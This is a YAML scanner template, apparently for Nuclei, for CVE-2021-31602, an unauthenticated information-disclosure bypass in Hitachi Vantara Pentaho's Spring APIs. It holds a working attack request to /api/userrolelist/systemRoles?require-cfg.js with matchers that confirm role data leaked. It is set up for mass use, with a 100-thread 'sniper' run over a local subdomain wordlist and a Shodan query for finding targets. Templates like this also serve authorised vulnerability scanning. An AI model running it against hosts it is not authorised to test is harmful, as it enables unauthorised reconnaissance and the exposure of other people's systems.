id: CVE-2021-31602-2

info:
  name: Pentaho <= 9.1 Authentication Bypass of Spring APIs
  author: pussycat0x
  severity: medium
  reference:
    - https://seclists.org/fulldisclosure/2021/Nov/13
    - https://portswigger.net/daily-swig/remote-code-execution-sql-injection-bugs-uncovered-in-pentaho-business-analytics-software
    - https://hawsec.com/publications/pentaho/HVPENT210401-Pentaho-BA-Security-Assessment-Report-v1_1.pdf
  metadata:
    shodan-query: 'Pentaho'
  tags: cve,cve2021,pentaho,auth-bypass

  description: "An issue was discovered in Hitachi Vantara Pentaho through 9.1 and Pentaho Business Intelligence Server through 7.x. The Security Model has different layers of Access Control. One of these layers is the applicationContext security, which is defined in the applicationContext-spring-security.xml file. The default configuration allows an unauthenticated user with no previous knowledge of the platform settings to extract pieces of information without possessing valid credentials.\n\n"

requests:
  - payloads:
      Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
    attack: sniper
    threads: 100

    raw:
      - |
        GET /api/userrolelist/systemRoles?require-cfg.js HTTP/1.1
        Host: {{Subdomains}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0
        Accept-Encoding: gzip, deflate
        Accept: */*
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '<roleList>'
          - '<roles>Anonymous</roles>'
        condition: and

      - type: status
        status:
          - 200